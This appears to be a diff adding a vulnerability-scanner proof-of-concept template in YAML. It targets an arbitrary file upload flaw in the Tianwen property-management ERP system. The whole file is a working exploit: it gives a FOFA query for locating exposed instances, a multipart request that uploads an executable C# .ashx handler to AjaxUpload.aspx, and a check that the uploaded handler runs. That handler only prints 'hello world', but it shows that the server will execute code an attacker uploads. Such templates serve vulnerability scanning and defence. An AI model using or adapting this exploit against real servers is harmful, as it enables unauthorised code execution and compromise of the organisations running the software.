@@ -1,0 +1,35 @@
+id: poc-yaml-tianwen-wuye-erp-ajaxupload-upload
+info:
+  name: 天问物业ERP系统 AjaxUpload.aspx任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 天问物业ERP系统
+  fofa: body="国家版权局软著登字第1205328号"
+requests:
+- method: POST
+  path: /HM/M_Main/AjaxUpload.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: "--00content0boundary00\nContent-Disposition: form-data; name=\"UpFileData\"\
+    ; filename=\"1.ashx\"\n\n<% @ webhandler language=\"C#\" class=\"AverageHandler\"\
+    \ %>\nusing System;\nusing System.Web;\n\npublic class AverageHandler : IHttpHandler\n\
+    {\n    public bool IsReusable\n    {\n      get {\n        return true;\n    \
+    \  }\n    }\n    public void ProcessRequest(HttpContext ctx)\n    {\n      ctx.Response.Write(\"\
+    hello world\");\n    }\n}\n--00content0boundary00--\n"
+  expression: 'status_code == 200 &&
+
+    contains(body,"/HM/M_Main/UploadFiles/PersonAdjunct")
+
+    '
+  output:
+  - regex_match(body,`(?P<path>.*)`)
+- method: GET
+  path: '{{.path}}'
+  expression: 'status_code == 200 &&
+
+    body == "hello world"
+
+    '
+variables: {}
+transport: http
